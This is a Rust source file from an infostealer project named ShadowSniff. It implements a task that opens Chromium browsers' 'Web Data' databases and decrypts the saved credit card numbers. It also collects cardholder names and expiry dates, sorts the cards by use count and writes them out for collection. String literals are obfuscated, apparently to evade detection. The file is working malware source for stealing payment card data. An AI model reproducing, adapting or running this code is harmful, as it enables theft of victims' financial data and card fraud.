/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use crate::alloc::borrow::ToOwned;
use crate::chromium::{BrowserData, decrypt_data};
use crate::{CreditCard, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all};
use alloc::sync::Arc;
use collector::{Browser, Collector};
use database::TableRecord;
use derive_new::new;
use filesystem::FileSystem;
use filesystem::path::Path;
use filesystem::storage::StorageFileSystem;
use obfstr::obfstr as s;
use tasks::{Task, parent_name};

const CREDIT_CARDS_NAME_ON_CARD: usize = 1;
const CREDIT_CARDS_EXPIRATION_MONTH: usize = 2;
const CREDIT_CARDS_EXPIRATION_YEAR: usize = 3;
const CREDIT_CARDS_CARD_NUMBER: usize = 4;
const CREDIT_CARDS_USE_COUNT: usize = 7;

#[derive(new)]
pub(super) struct CreditCardsTask {
    browser: Arc<BrowserData>,
}

impl<C: Collector, F: FileSystem> Task<C, F> for CreditCardsTask {
    parent_name!("CreditCards.txt");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let Some(mut credit_cards) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
            &self.browser.profiles,
            &StorageFileSystem,
            |profile| profile / s!("Web Data"),
            s!("Credit_cards"),
            |record| extract_card_from_record(record, &self.browser),
        ) else {
            return;
        };

        credit_cards.sort_by(|a, b| b.use_count.cmp(&a.use_count));

        collector
            .get_browser()
            .increase_credit_cards_by(credit_cards.len());

        let _ = to_string_and_write_all(&credit_cards, "\n\n", filesystem, parent);
    }
}

fn extract_card_from_record<R: TableRecord>(
    record: &R,
    browser_data: &BrowserData,
) -> Option<CreditCard> {
    let name_on_card = record.get_value(CREDIT_CARDS_NAME_ON_CARD)?.as_string()?;
    let expiration_month = record
        .get_value(CREDIT_CARDS_EXPIRATION_MONTH)?
        .as_integer()?;
    let expiration_year = record
        .get_value(CREDIT_CARDS_EXPIRATION_YEAR)?
        .as_integer()?;
    let use_count = record.get_value(CREDIT_CARDS_USE_COUNT)?.as_integer()?;

    let encrypted_card_number = record.get_value(CREDIT_CARDS_CARD_NUMBER)?.as_blob()?;
    let card_number = decrypt_data(&encrypted_card_number, browser_data)?.into();

    Some(CreditCard {
        name_on_card,
        expiration_month,
        expiration_year,
        card_number,
        use_count,
    })
}
